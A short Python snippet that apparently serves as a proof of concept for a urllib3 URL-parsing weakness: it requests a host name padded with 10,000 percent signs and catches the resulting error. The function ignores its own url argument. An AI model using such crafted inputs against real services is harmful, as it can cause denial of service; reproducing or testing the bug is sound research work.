import urllib3

def vulnerable_function(url):
    http = urllib3.PoolManager()

    malicious_url = "http://" + "%" * 10000 + ".example.com"

    try:
        response = http.request('GET', malicious_url)
    except urllib3.exceptions.MaxRetryError:
        print("Error making request")

vulnerable_function("http://example.com")